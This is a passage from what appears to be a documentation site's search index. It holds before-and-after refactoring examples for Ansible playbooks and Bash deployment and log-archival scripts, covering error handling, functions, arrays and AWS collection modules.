<p>Alternative (using set_fact for complex conditions):</p> <pre><code>---\n- name: Configure application\n  hosts: all\n  become: true\n\n  tasks:\n    - name: Set environment facts\n      set_fact:\n        is_production_ubuntu: &gt;-\n          {{ environment == 'production' and\n             ansible_distribution == 'Ubuntu' and\n             ansible_distribution_major_version|int &gt;= 20 }}\n        is_production_centos: &gt;-\n          {{ environment == 'production' and\n             ansible_distribution == 'CentOS' and\n             ansible_distribution_major_version|int &gt;= 8 }}\n        is_staging: &gt;-\n          {{ environment == 'staging' }}\n\n    - name: Install package for production Ubuntu\n      apt:\n        name: myapp-pro\n        state: present\n      when: is_production_ubuntu | bool\n\n    - name: Install package for production CentOS\n      yum:\n        name: myapp-pro\n        state: present\n      when: is_production_centos | bool\n\n    - name: Configure production database\n      template:\n        src: db_config_prod.j2\n        dest: /etc/myapp/database.yml\n      when: is_production_ubuntu | bool or is_production_centos | bool\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 No repeated complex conditionals</li> <li>\u2705 Environment-specific vars in group_vars</li> <li>\u2705 OS-specific tasks in separate files</li> <li>\u2705 Clear, readable conditions</li> <li>\u2705 Easy to add new environments or OS types</li> </ul>","tags":["ansible","refactoring","best-practices","examples","automation"]},{"location":"09_refactoring/ansible_refactoring/#use-collections","title":"Use Collections","text":"","tags":["ansible","refactoring","best-practices","examples","automation"]},{"location":"09_refactoring/ansible_refactoring/#problem-using-deprecated-or-built-in-modules-with-limited-functionality","title":"Problem: Using deprecated or built-in modules with limited functionality","text":"<p>Before (using built-in modules):</p> <pre><code>---\n- name: Manage AWS resources\n  hosts: localhost\n  gather_facts: no\n\n  tasks:\n    - name: Create EC2 instance (deprecated module)\n      ec2:\n        key_name: mykey\n        instance_type: t3.medium\n        image: ami-12345\n        wait: yes\n        group: webserver\n        count: 1\n        vpc_subnet_id: subnet-12345\n        assign_public_ip: yes\n\n    - name: Create S3 bucket (limited functionality)\n      s3_bucket:\n        name: my-bucket\n        state: present\n\n    - name: Manage RDS instance (basic module)\n      rds:\n        command: create\n        instance_name: mydb\n        db_engine: postgres\n        size: 20\n        instance_type: db.t3.medium\n        username: admin\n        password: \"{{ db_password }}\"\n</code></pre> <p>After (using amazon.aws collection):</p> <pre><code>---\n- name: Manage AWS resources\n  hosts: localhost\n  gather_facts: no\n\n  collections:\n    - amazon.aws\n    - community.aws\n\n  tasks:\n    - name: Create EC2 instance (modern module)\n      ec2_instance:\n        key_name: mykey\n        instance_type: t3.medium\n        image_id: ami-12345\n        wait: yes\n        security_groups:\n          - webserver\n        vpc_subnet_id: subnet-12345\n        network:\n          assign_public_ip: yes\n        tags:\n          Name: \"{{ instance_name }}\"\n          Environment: \"{{ environment }}\"\n        state: running\n\n    - name: Create S3 bucket with advanced features\n      s3_bucket:\n        name: my-bucket\n        state: present\n        encryption: \"AES256\"\n        versioning: yes\n        public_access:\n          block_public_acls: yes\n          block_public_policy: yes\n          ignore_public_acls: yes\n          restrict_public_buckets: yes\n        tags:\n          Environment: \"{{ environment }}\"\n\n    - name: Create RDS instance with full configuration\n      rds_instance:\n        db_instance_identifier: mydb\n        engine: postgres\n        engine_version: \"13.7\"\n        db_instance_class: db.t3.medium\n        allocated_storage: 20\n        storage_type: gp3\n        storage_encrypted: yes\n        master_username: admin\n        master_user_password: \"{{ db_password }}\"\n        vpc_security_group_ids:\n          - \"{{ db_security_group_id }}\"\n        db_subnet_group_name: \"{{ db_subnet_group }}\"\n        backup_retention_period: 7\n        preferred_backup_window: \"03:00-04:00\"\n        preferred_maintenance_window: \"sun:04:00-sun:05:00\"\n        multi_az: yes\n        auto_minor_version_upgrade: yes\n        tags:\n          Name: mydb\n          Environment: \"{{ environment }}\"\n        state: present\n\n    - name: Query EC2 instance info\n      ec2_instance_info:\n        filters:\n          \"tag:Environment\": \"{{ environment }}\"\n          instance-state-name: running\n      register: ec2_info\n\n    - name: Display instance IPs\n      debug:\n        msg: \"Instance {{ item.tags.Name }} has IP {{ item.public_ip_address }}\"\n      loop: \"{{ ec2_info.instances }}\"\n</code></pre> <p>Using Multiple Collections:</p> <pre><code>---\n- name: Complete infrastructure setup\n  hosts: localhost\n  gather_facts: no\n\n  collections:\n    - amazon.aws\n    - community.aws\n    - community.general\n    - ansible.posix\n\n  tasks:\n    - name: Create VPC\n      ec2_vpc_net:\n        name: \"{{ vpc_name }}\"\n        cidr_block: \"{{ vpc_cidr }}\"\n        region: \"{{ aws_region }}\"\n        tags: \"{{ common_tags }}\"\n        state: present\n      register: vpc\n\n    - name: Create CloudWatch log group (community.aws)\n      cloudwatchlogs_log_group:\n        log_group_name: \"/aws/{{ environment }}/{{ app_name }}\"\n        retention: 7\n        state: present\n\n    - name: Send Slack notification (community.general)\n      slack:\n        token: \"{{ slack_token }}\"\n        msg: \"Infrastructure provisioning started for {{ environment }}\"\n        channel: \"#ops\"\n      delegate_to: localhost\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Modern, maintained modules with full features</li> <li>\u2705 Better error handling and return values</li> <li>\u2705 Support for latest AWS features</li> <li>\u2705 Consistent module interface across providers</li> <li>\u2705 Community-maintained collections stay up-to-date</li> <li>\u2705 Access to specialized modules (monitoring, logging, etc.)</li> </ul>","tags":["ansible","refactoring","best-practices","examples","automation"]},{"location":"09_refactoring/ansible_refactoring/#resources","title":"Resources","text":"","tags":["ansible","refactoring","best-practices","examples","automation"]},{"location":"09_refactoring/ansible_refactoring/#tools","title":"Tools","text":"<ul> <li>ansible-lint: Linting for playbooks and roles</li> <li>yamllint: YAML syntax checking</li> <li>molecule: Role testing framework</li> <li>ansible-playbook --syntax-check: Syntax validation</li> </ul>","tags":["ansible","refactoring","best-practices","examples","automation"]},{"location":"09_refactoring/ansible_refactoring/#related-documentation","title":"Related Documentation","text":"<ul> <li>Ansible Style Guide</li> <li>YAML Style Guide</li> <li>Testing Strategies</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-12-06</p>","tags":["ansible","refactoring","best-practices","examples","automation"]},{"location":"09_refactoring/bash_refactoring/","title":"Bash Refactoring Examples","text":"<p>Real-world examples of refactoring Bash scripts to improve reliability, maintainability, and adherence to best practices.</p>","tags":["bash","refactoring","best-practices","examples","shell-scripting"]},{"location":"09_refactoring/bash_refactoring/#extract-functions-from-scripts","title":"Extract Functions from Scripts","text":"","tags":["bash","refactoring","best-practices","examples","shell-scripting"]},{"location":"09_refactoring/bash_refactoring/#problem-long-monolithic-script-with-duplicated-code","title":"Problem: Long monolithic script with duplicated code","text":"<p>Before (300+ line script):</p> <pre><code>#!/bin/bash\n\n## Deploy application script\nAPP_NAME=\"myapp\"\nENVIRONMENT=$1\n\nif [ -z \"$ENVIRONMENT\" ]; then\n    echo \"Error: Environment not specified\"\n    exit 1\nfi\n\nif [ \"$ENVIRONMENT\" != \"dev\" ] &amp;&amp; [ \"$ENVIRONMENT\" != \"staging\" ] &amp;&amp; [ \"$ENVIRONMENT\" != \"production\" ]; then\n    echo \"Error: Invalid environment\"\n    exit 1\nfi\n\n## Stop application\necho \"Stopping $APP_NAME...\"\nsystemctl stop $APP_NAME\nif [ $? -ne 0 ]; then\n    echo \"Error: Failed to stop service\"\n    exit 1\nfi\n\n## Backup current version\nBACKUP_DIR=\"/opt/$APP_NAME/backups\"\nmkdir -p $BACKUP_DIR\nTIMESTAMP=$(date +%Y%m%d_%H%M%S)\necho \"Creating backup...\"\ntar -czf $BACKUP_DIR/backup_$TIMESTAMP.tar.gz /opt/$APP_NAME/current\nif [ $? -ne 0 ]; then\n    echo \"Error: Backup failed\"\n    exit 1\nfi\n\n## Download new version\necho \"Downloading new version...\"\ncurl -o /tmp/$APP_NAME.tar.gz https://releases.example.com/$APP_NAME/latest.tar.gz\nif [ $? -ne 0 ]; then\n    echo \"Error: Download failed\"\n    exit 1\nfi\n\n## Extract new version\necho \"Extracting new version...\"\nrm -rf /opt/$APP_NAME/current\ntar -xzf /tmp/$APP_NAME.tar.gz -C /opt/$APP_NAME/\nif [ $? -ne 0 ]; then\n    echo \"Error: Extraction failed\"\n    # Restore backup\n    echo \"Restoring backup...\"\n    tar -xzf $BACKUP_DIR/backup_$TIMESTAMP.tar.gz -C /\n    systemctl start $APP_NAME\n    exit 1\nfi\n\n## Start application\necho \"Starting $APP_NAME...\"\nsystemctl start $APP_NAME\nif [ $? -ne 0 ]; then\n    echo \"Error: Failed to start service\"\n    # Restore backup\n    echo \"Restoring backup...\"\n    tar -xzf $BACKUP_DIR/backup_$TIMESTAMP.tar.gz -C /\n    systemctl start $APP_NAME\n    exit 1\nfi\n\n## Check application health\necho \"Checking application health...\"\nsleep 5\ncurl -f http://localhost:8080/health\nif [ $? -ne 0 ]; then\n    echo \"Error: Health check failed\"\n    # Restore backup\n    echo \"Restoring backup...\"\n    systemctl stop $APP_NAME\n    tar -xzf $BACKUP_DIR/backup_$TIMESTAMP.tar.gz -C /\n    systemctl start $APP_NAME\n    exit 1\nfi\n\necho \"Deployment completed successfully\"\n## ... 200+ more lines with similar patterns\n</code></pre> <p>After (modular with functions):</p> <pre><code>#!/bin/bash\n#\n## Deploy application script\n#\n## Usage: deploy.sh &lt;environment&gt;\n## Example: deploy.sh production\n\nset -euo pipefail\nIFS=$'\\n\\t'\n\n## Constants\nreadonly SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" &amp;&amp; pwd)\"\nreadonly APP_NAME=\"myapp\"\nreadonly APP_DIR=\"/opt/${APP_NAME}\"\nreadonly BACKUP_DIR=\"${APP_DIR}/backups\"\nreadonly HEALTH_ENDPOINT=\"http://localhost:8080/health\"\n\n## Colors for output\nreadonly COLOR_RED='\\033[0;31m'\nreadonly COLOR_GREEN='\\033[0;32m'\nreadonly COLOR_YELLOW='\\033[1;33m'\nreadonly COLOR_NC='\\033[0m' # No Color\n\n## Global variables\nENVIRONMENT=\"\"\nTIMESTAMP=\"\"\nBACKUP_FILE=\"\"\n\n#######################################\n## Print error message and exit\n## Arguments:\n##   $1 - Error message\n## Returns:\n##   None (exits with code 1)\n#######################################\nerror_exit() {\n    echo -e \"${COLOR_RED}Error: $1${COLOR_NC}\" &gt;&amp;2\n    exit 1\n}\n\n#######################################\n## Print info message\n## Arguments:\n##   $1 - Info message\n#######################################\ninfo() {\n    echo -e \"${COLOR_GREEN}[INFO]${COLOR_NC} $1\"\n}\n\n#######################################\n## Print warning message\n## Arguments:\n##   $1 - Warning message\n#######################################\nwarn() {\n    echo -e \"${COLOR_YELLOW}[WARN]${COLOR_NC} $1\"\n}\n\n#######################################\n## Validate environment parameter\n## Arguments:\n##   $1 - Environment name\n## Returns:\n##   0 if valid, exits if invalid\n#######################################\nvalidate_environment() {\n    local env=$1\n    local valid_envs=(\"dev\" \"staging\" \"production\")\n\n    if [[ -z \"${env}\" ]]; then\n        error_exit \"Environment not specified. Usage: $0 &lt;environment&gt;\"\n    fi\n\n    if [[ ! \" ${valid_envs[*]} \" =~ ${env} ]]; then\n        error_exit \"Invalid environment '${env}'. Valid options: ${valid_envs[*]}\"\n    fi\n\n    ENVIRONMENT=\"${env}\"\n    info \"Environment validated: ${ENVIRONMENT}\"\n}\n\n#######################################\n## Stop the application service\n## Returns:\n##   0 on success, exits on failure\n#######################################\nstop_service() {\n    info \"Stopping ${APP_NAME} service...\"\n\n    if ! systemctl stop \"${APP_NAME}\"; then\n        error_exit \"Failed to stop ${APP_NAME} service\"\n    fi\n\n    info \"Service stopped successfully\"\n}\n\n#######################################\n## Start the application service\n## Returns:\n##   0 on success, exits on failure\n#######################################\nstart_service() {\n    info \"Starting ${APP_NAME} service...\"\n\n    if ! systemctl start \"${APP_NAME}\"; then\n        error_exit \"Failed to start ${APP_NAME} service\"\n    fi\n\n    info \"Service started successfully\"\n}\n\n#######################################\n## Create backup of current version\n## Sets:\n##   BACKUP_FILE - Path to created backup\n## Returns:\n##   0 on success, exits on failure\n#######################################\ncreate_backup() {\n    info \"Creating backup of current version...\"\n\n    mkdir -p \"${BACKUP_DIR}\"\n    TIMESTAMP=$(date +%Y%m%d_%H%M%S)\n    BACKUP_FILE=\"${BACKUP_DIR}/backup_${TIMESTAMP}.tar.gz\"\n\n    if ! tar -czf \"${BACKUP_FILE}\" -C \"${APP_DIR}\" current; then\n        error_exit \"Failed to create backup\"\n    fi\n\n    info \"Backup created: ${BACKUP_FILE}\"\n}\n\n#######################################\n## Restore from backup file\n## Arguments:\n##   $1 - Backup file path\n## Returns:\n##   0 on success, 1 on failure\n#######################################\nrestore_backup() {\n    local backup_file=$1\n\n    warn \"Restoring from backup: ${backup_file}\"\n\n    if [[ ! -f \"${backup_file}\" ]]; then\n        echo \"Backup file not found: ${backup_file}\" &gt;&amp;2\n        return 1\n    fi\n\n    rm -rf \"${APP_DIR}/current\"\n\n    if ! tar -xzf \"${backup_file}\" -C \"${APP_DIR}\"; then\n        echo \"Failed to restore backup\" &gt;&amp;2\n        return 1\n    fi\n\n    info \"Backup restored successfully\"\n    return 0\n}\n\n#######################################\n## Download new application version\n## Returns:\n##   0 on success, exits on failure\n#######################################\ndownload_release() {\n    local release_url=\"https://releases.example.com/${APP_NAME}/latest.tar.gz\"\n    local download_path=\"/tmp/${APP_NAME}.tar.gz\"\n\n    info \"Downloading release from ${release_url}...\"\n\n    if ! curl -fSL -o \"${download_path}\" \"${release_url}\"; then\n        error_exit \"Failed to download release\"\n    fi\n\n    info \"Download completed\"\n}\n\n#######################################\n## Extract downloaded release\n## Returns:\n##   0 on success, exits on failure\n#######################################\nextract_release() {\n    local archive_path=\"/tmp/${APP_NAME}.tar.gz\"\n\n    info \"Extracting release...\"\n\n    rm -rf \"${APP_DIR}/current\"\n    mkdir -p \"${APP_DIR}/current\"\n\n    if ! tar -xzf \"${archive_path}\" -C \"${APP_DIR}/current\"; then\n        error_exit \"Failed to extract release\"\n    fi\n\n    rm -f \"${archive_path}\"\n    info \"Extraction completed\"\n}\n\n#######################################\n## Check application health\n## Arguments:\n##   $1 - Max retries (default: 5)\n##   $2 - Retry delay in seconds (default: 5)\n## Returns:\n##   0 if healthy, 1 if unhealthy\n#######################################\ncheck_health() {\n    local max_retries=${1:-5}\n    local retry_delay=${2:-5}\n    local attempt=1\n\n    info \"Checking application health...\"\n\n    while [[ ${attempt} -le ${max_retries} ]]; do\n        if curl -fSL \"${HEALTH_ENDPOINT}\" &gt;/dev/null 2&gt;&amp;1; then\n            info \"Health check passed\"\n            return 0\n        fi\n\n        warn \"Health check failed (attempt ${attempt}/${max_retries})\"\n\n        if [[ ${attempt} -lt ${max_retries} ]]; then\n            sleep \"${retry_delay}\"\n        fi\n\n        ((attempt++))\n    done\n\n    echo \"Health check failed after ${max_retries} attempts\" &gt;&amp;2\n    return 1\n}\n\n#######################################\n## Rollback deployment\n## Returns:\n##   None (exits after rollback attempt)\n#######################################\nrollback_deployment() {\n    warn \"Rolling back deployment...\"\n\n    stop_service || true\n\n    if restore_backup \"${BACKUP_FILE}\"; then\n        start_service\n\n        if check_health 3 5; then\n            error_exit \"Deployment failed. Successfully rolled back to previous version.\"\n        else\n            error_exit \"Deployment failed. Rollback completed but health check failed.\"\n        fi\n    else\n        error_exit \"Deployment failed. Rollback also failed. Manual intervention required.\"\n    fi\n}\n\n#######################################\n## Main deployment workflow\n#######################################\nmain() {\n    validate_environment \"$1\"\n\n    info \"Starting deployment to ${ENVIRONMENT}\"\n\n    # Stop service\n    stop_service\n\n    # Create backup\n    create_backup\n\n    # Download and extract\n    if ! download_release; then\n        rollback_deployment\n    fi\n\n    if ! extract_release; then\n        rollback_deployment\n    fi\n\n    # Start service\n    start_service\n\n    # Health check\n    if ! check_health; then\n        rollback_deployment\n    fi\n\n    info \"Deployment completed successfully!\"\n}\n\n## Script entry point\nif [[ \"${BASH_SOURCE[0]}\" == \"${0}\" ]]; then\n    main \"$@\"\nfi\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Functions with single responsibilities</li> <li>\u2705 Comprehensive error handling</li> <li>\u2705 Automatic rollback on failure</li> <li>\u2705 Documented functions (following Google style)</li> <li>\u2705 Consistent naming conventions</li> <li>\u2705 Proper exit codes</li> <li>\u2705 Retry logic for health checks</li> <li>\u2705 Color-coded output</li> </ul>","tags":["bash","refactoring","best-practices","examples","shell-scripting"]},{"location":"09_refactoring/bash_refactoring/#add-error-handling","title":"Add Error Handling","text":"","tags":["bash","refactoring","best-practices","examples","shell-scripting"]},{"location":"09_refactoring/bash_refactoring/#problem-no-error-handling-script-continues-after-failures","title":"Problem: No error handling, script continues after failures","text":"<p>Before:</p> <pre><code>#!/bin/bash\n\n## Process log files\nLOG_DIR=\"/var/log/myapp\"\nARCHIVE_DIR=\"/var/log/myapp/archive\"\n\n## Create archive directory\nmkdir $ARCHIVE_DIR\n\n## Find old logs\nOLD_LOGS=$(find $LOG_DIR -name \"*.log\" -mtime +7)\n\n## Compress old logs\nfor log in $OLD_LOGS; do\n    gzip $log\n    mv $log.gz $ARCHIVE_DIR/\ndone\n\n## Delete very old archives\nfind $ARCHIVE_DIR -name \"*.gz\" -mtime +30 -delete\n\n## Upload to S3\naws s3 sync $ARCHIVE_DIR s3://my-bucket/logs/\n\necho \"Log processing complete\"\n## If any command fails, we might delete logs before uploading!\n</code></pre> <p>After:</p> <pre><code>#!/bin/bash\n#\n## Process and archive application logs\n#\n## This script:\n##   1. Compresses logs older than 7 days\n##   2. Moves compressed logs to archive directory\n##   3. Uploads archives to S3\n##   4. Deletes archives older than 30 days\n\n## Exit on error, undefined variables, and pipe failures\nset -euo pipefail\n\n## Set IFS to prevent word splitting issues\nIFS=$'\\n\\t'\n\n## Constants\nreadonly SCRIPT_NAME=$(basename \"$0\")\nreadonly LOG_DIR=\"/var/log/myapp\"\nreadonly ARCHIVE_DIR=\"${LOG_DIR}/archive\"\nreadonly S3_BUCKET=\"s3://my-bucket/logs\"\nreadonly RETENTION_DAYS=7\nreadonly ARCHIVE_RETENTION_DAYS=30\n\n## Logging functions\nlog_info() {\n    echo \"[$(date +'%Y-%m-%d %H:%M:%S')] [INFO] $*\" &gt;&amp;2\n}\n\nlog_error() {\n    echo \"[$(date +'%Y-%m-%d %H:%M:%S')] [ERROR] $*\" &gt;&amp;2\n}\n\nlog_fatal() {\n    echo \"[$(date +'%Y-%m-%d %H:%M:%S')] [FATAL] $*\" &gt;&amp;2\n    exit 1\n}\n\n#######################################\n## Validate prerequisites\n## Checks that required commands and directories exist\n#######################################\nvalidate_prerequisites() {\n    log_info \"Validating prerequisites...\"\n\n    # Check required commands\n    local required_commands=(\"find\" \"gzip\" \"aws\")\n    for cmd in \"${required_commands[@]}\"; do\n        if ! command -v \"${cmd}\" &amp;&gt; /dev/null; then\n            log_fatal \"Required command not found: ${cmd}\"\n        fi\n    done\n\n    # Validate log directory exists\n    if [[ ! -d \"${LOG_DIR}\" ]]; then\n        log_fatal \"Log directory does not exist: ${LOG_DIR}\"\n    fi\n\n    # Validate AWS credentials\n    if ! aws sts get-caller-identity &amp;&gt;/dev/null; then\n        log_fatal \"AWS credentials not configured or invalid\"\n    fi\n\n    log_info \"Prerequisites validated\"\n}\n\n#######################################\n## Create archive directory if it doesn't exist\n#######################################\ncreate_archive_dir() {\n    log_info \"Creating archive directory...\"\n\n    if [[ ! -d \"${ARCHIVE_DIR}\" ]]; then\n        if ! mkdir -p \"${ARCHIVE_DIR}\"; then\n            log_fatal \"Failed to create archive directory: ${ARCHIVE_DIR}\"\n        fi\n        log_info \"Archive directory created: ${ARCHIVE_DIR}\"\n    else\n        log_info \"Archive directory already exists\"\n    fi\n}\n\n#######################################\n## Compress old log files\n## Returns:\n##   Number of files compressed\n#######################################\ncompress_old_logs() {\n    log_info \"Searching for logs older than ${RETENTION_DAYS} days...\"\n\n    local compressed_count=0\n    local failed_count=0\n\n    # Find old logs (excluding already compressed files)\n    while IFS= read -r -d '' log_file; do\n        log_info \"Compressing: ${log_file}\"\n\n        if gzip -9 \"${log_file}\"; then\n            ((compressed_count++))\n        else\n            log_error \"Failed to compress: ${log_file}\"\n            ((failed_count++))\n        fi\n    done &lt; &lt;(find \"${LOG_DIR}\" -maxdepth 1 -name \"*.log\" -type f -mtime \"+${RETENTION_DAYS}\" -print0)\n\n    log_info \"Compressed ${compressed_count} files (${failed_count} failures)\"\n\n    if [[ ${failed_count} -gt 0 ]]; then\n        log_error \"Some files failed to compress\"\n        return 1\n    fi\n\n    return 0\n}\n\n#######################################\n## Move compressed logs to archive\n#######################################\nmove_to_archive() {\n    log_info \"Moving compressed logs to archive...\"\n\n    local moved_count=0\n    local failed_count=0\n\n    while IFS= read -r -d '' gz_file; do\n        local filename=$(basename \"${gz_file}\")\n\n        if mv \"${gz_file}\" \"${ARCHIVE_DIR}/${filename}\"; then\n            log_info \"Moved: ${filename}\"\n            ((moved_count++))\n        else\n            log_error \"Failed to move: ${filename}\"\n            ((failed_count++))\n        fi\n    done &lt; &lt;(find \"${LOG_DIR}\" -maxdepth 1 -name \"*.log.gz\" -type f -print0)\n\n    log_info \"Moved ${moved_count} files (${failed_count} failures)\"\n\n    if [[ ${failed_count} -gt 0 ]]; then\n        log_error \"Some files failed to move\"\n        return 1\n    fi\n\n    return 0\n}\n\n#######################################\n## Upload archives to S3\n#######################################\nupload_to_s3() {\n    log_info \"Uploading archives to S3: ${S3_BUCKET}...\"\n\n    # Count files before upload\n    local file_count\n    file_count=$(find \"${ARCHIVE_DIR}\" -name \"*.gz\" -type f | wc -l)\n\n    if [[ ${file_count} -eq 0 ]]; then\n        log_info \"No files to upload\"\n        return 0\n    fi\n\n    log_info \"Uploading ${file_count} archive files...\"\n\n    # Sync with S3, keeping a local copy\n    if ! aws s3 sync \"${ARCHIVE_DIR}\" \"${S3_BUCKET}\" \\\n            --storage-class STANDARD_IA \\\n            --no-progress; then\n        log_error \"S3 upload failed\"\n        return 1\n    fi\n\n    log_info \"Upload completed successfully\"\n    return 0\n}\n\n#######################################\n## Delete old archives (already uploaded to S3)\n#######################################\ncleanup_old_archives() {\n    log_info \"Cleaning up archives older than ${ARCHIVE_RETENTION_DAYS} days...\"\n\n    local deleted_count=0\n\n    while IFS= read -r -d '' archive_file; do\n        local filename=$(basename \"${archive_file}\")\n        log_info \"Deleting old archive: ${filename}\"\n\n        if rm \"${archive_file}\"; then\n            ((deleted_count++))\n        else\n            log_error \"Failed to delete: ${filename}\"\n        fi\n    done &lt; &lt;(find \"${ARCHIVE_DIR}\" -name \"*.gz\" -type f -mtime \"+${ARCHIVE_RETENTION_DAYS}\" -print0)\n\n    log_info \"Deleted ${deleted_count} old archives\"\n    return 0\n}\n\n#######################################\n## Main execution\n#######################################\nmain() {\n    log_info \"Starting log archival process\"\n\n    validate_prerequisites\n    create_archive_dir\n\n    # Compress and move (fail if either fails)\n    if ! compress_old_logs; then\n        log_fatal \"Log compression failed\"\n    fi\n\n    if ! move_to_archive; then\n        log_fatal \"Moving logs to archive failed\"\n    fi\n\n    # Upload to S3 (critical - fail if upload fails)\n    if ! upload_to_s3; then\n        log_fatal \"S3 upload failed - archives retained locally\"\n    fi\n\n    # Cleanup (not critical - warn on failure)\n    if ! cleanup_old_archives; then\n        log_error \"Cleanup failed, but archives are uploaded to S3\"\n    fi\n\n    log_info \"Log archival process completed successfully\"\n}\n\n## Trap errors for additional logging\ntrap 'log_error \"Script failed on line $LINENO\"' ERR\n\n## Run main function\nif [[ \"${BASH_SOURCE[0]}\" == \"${0}\" ]]; then\n    main \"$@\"\nfi\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 <code>set -euo pipefail</code> for strict error handling</li> <li>\u2705 Validation of prerequisites before execution</li> <li>\u2705 Structured error logging with timestamps</li> <li>\u2705 Graceful handling of failures</li> <li>\u2705 Safe file processing with <code>-print0</code> and <code>read -d ''</code></li> <li>\u2705 Count and report successes/failures</li> <li>\u2705 Critical operations fail fast, non-critical warn only</li> <li>\u2705 Error trap for debugging</li> </ul>","tags":["bash","refactoring","best-practices","examples","shell-scripting"]},{"location":"09_refactoring/bash_refactoring/#use-arrays-instead-of-strings","title":"Use Arrays Instead of Strings","text":"","tags":["bash","refactoring","best-practices","examples","shell-scripting"]},{"location":"09_refactoring/bash_refactoring/#problem-string-manipulation-for-lists-causing-word-splitting-issues","title":"Problem: String manipulation for lists causing word splitting issues","text":"<p>Before:</p> <pre><code>#!/bin/bash\n\n## Install packages\nPACKAGES=\"nginx mysql-server redis-server git curl wget\"\n\n## Install each package\nfor package in $PACKAGES; do\n    apt-get install -y $package\ndone\n\n## Process files\nFILES=$(find /var/log -name \"*.log\")\n\nfor file in $FILES; do\n    # This breaks on filenames with spaces!\n    gzip $file\ndone\n\n## Server list\nSERVERS=\"web-01 web-02 db-01 cache-01\"\n\n## Check server status\nfor server in $SERVERS; do\n    ssh $server \"systemctl status myapp\"\ndone\n</code></pre> <p>After:</p> <pre><code>#!/bin/bash\n\nset -euo pipefail\n\n## Use arrays for lists\ndeclare -a PACKAGES=(\n    \"nginx\"\n    \"mysql-server\"\n    \"redis-server\"\n    \"git\"\n    \"curl\"\n    \"wget\"\n)\n\n## Install packages\ninstall_packages() {\n    local package\n\n    for package in \"${PACKAGES[@]}\"; do\n        echo \"Installing ${package}...\"\n        if ! apt-get install -y \"${package}\"; then\n            echo \"Failed to install ${package}\" &gt;&amp;2\n            return 1\n        fi\n    done\n}\n\n## Process files safely\nprocess_log_files() {\n    local -a log_files\n\n    # Read into array safely\n    mapfile -t log_files &lt; &lt;(find /var/log -name \"*.log\" -type f)\n\n    if [[ ${#log_files[@]} -eq 0 ]]; then\n        echo \"No log files found\"\n        return 0\n    fi\n\n    local file\n    for file in \"${log_files[@]}\"; do\n        echo \"Processing: ${file}\"\n\n        # Handles filenames with spaces correctly\n        if [[ -f \"${file}\" ]]; then\n            gzip \"${file}\"\n        fi\n    done\n}\n\n## Server configuration\ndeclare -A SERVERS=(\n    [web-01]=\"10.0.1.10\"\n    [web-02]=\"10.0.1.11\"\n    [db-01]=\"10.0.2.10\"\n    [cache-01]=\"10.0.3.10\"\n)\n\n## Check server status\ncheck_servers() {\n    local hostname\n    local ip_address\n\n    for hostname in \"${!SERVERS[@]}\"; do\n        ip_address=\"${SERVERS[${hostname}]}\"\n\n        echo \"Checking ${hostname} (${ip_address})...\"\n\n        if ssh -o ConnectTimeout=5 \"${ip_address}\" \"systemctl status myapp\"; then\n            echo \"${hostname}: OK\"\n        else\n            echo \"${hostname}: FAILED\" &gt;&amp;2\n        fi\n    done\n}\n\n## Example with array of complex objects\ndeclare -a DEPLOYMENTS=(\n    \"app:myapp version:1.0.0 env:production\"\n    \"app:api version:2.1.0 env:staging\"\n    \"app:frontend version:1.5.2 env:production\"\n)\n\n## Process deployments\nprocess_deployments() {\n    local deployment\n    local app version env\n\n    for deployment in \"${DEPLOYMENTS[@]}\"; do\n        # Parse deployment string\n        app=$(echo \"${deployment}\" | grep -oP 'app:\\K\\S+')\n        version=$(echo \"${deployment}\" | grep -oP 'version:\\K\\S+')\n        env=$(echo \"${deployment}\" | grep -oP 'env:\\K\\S+')\n\n        echo \"Deploying ${app} v${version} to ${env}\"\n    done\n}\n\nmain() {\n    install_packages\n    process_log_files\n    check_servers\n    process_deployments\n}\n\nif [[ \"${BASH_SOURCE[0]}\" == \"${0}\" ]]; then\n    main \"$@\"\nfi\n</code></pre> <p>Even Better (using associative arrays for configuration):</p> <pre><code>#!/bin/bash\n\nset -euo pipefail\n\n## Server configuration with associative arrays\ndeclare -A WEB01=(\n    [hostname]=\"web-01\"\n    [ip]=\"10.0.1.10\"\n    [role]=\"webserver\"\n    [environment]=\"production\"\n)\n\ndeclare -A WEB02=(\n    [hostname]=\"web-02\"\n    [ip]=\"10.0.1.11\"\n    [role]=\"webserver\"\n    [environment]=\"production\"\n)\n\ndeclare -A DB01=(\n    [hostname]=\"db-01\"\n    [ip]=\"10.0.2.10\"\n    [role]=\"database\"\n    [environment]=\"production\"\n)\n\n## Array of server variable names\ndeclare -a ALL_SERVERS=(WEB01 WEB02 DB01)\n\n## Check server with full configuration\ncheck_server() {\n    local -n server=$1  # nameref to associative array\n\n    echo \"Checking ${server[hostname]} (${server[role]})...\"\n    echo \"  IP: ${server[ip]}\"\n    echo \"  Environment: ${server[environment]}\"\n\n    if ssh -o ConnectTimeout=5 \"${server[ip]}\" \"systemctl status myapp\"; then\n        echo \"  Status: OK\"\n        return 0\n    else\n        echo \"  Status: FAILED\" &gt;&amp;2\n        return 1\n    fi\n}\n\n## Main execution\nmain() {\n    local server_name\n    local failed_count=0\n\n    for server_name in \"${ALL_SERVERS[@]}\"; do\n        if ! check_server \"${server_name}\"; then\n            ((failed_count++))\n        fi\n        echo\n    done\n\n    if [[ ${failed_count} -gt 0 ]]; then\n        echo \"${failed_count} server(s) failed health check\" &gt;&amp;2\n        exit 1\n    fi\n\n    echo \"All servers healthy\"\n}\n\nif [[ \"${BASH_SOURCE[0]}\" == \"${0}\" ]]; then\n    main \"$@\"\nfi\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 No word splitting issues</li> <li>\u2705 Handles filenames with spaces</li> <li>\u2705 Type-safe with <code>declare</code></li> <li>\u2705 Associative arrays for key-value pairs</li> <li>\u2705 Named references (nameref) for passing arrays to functions</li> <li>\u2705 Proper quoting of array elements</li> </ul>","tags":["bash","refactoring","best-practices","examples","shell-scripting"]},{"location":"09_refactoring/bash_refactoring/#apply-posix-compliance","title":"Apply POSIX Compliance","text":"","tags":["bash","refactoring","best-practices","examples","shell-scripting"]},{"location":"09_refactoring/bash_refactoring/#problem-bash-specific-features-prevent-portability","title":"Problem: Bash-specific features prevent portability","text":"<p>Before (Bash-specific):</p> <pre><code>#!/bin/bash\n\n## Bash-specific features\nfunction deploy_app() {\n    local APP_NAME=$1\n    local 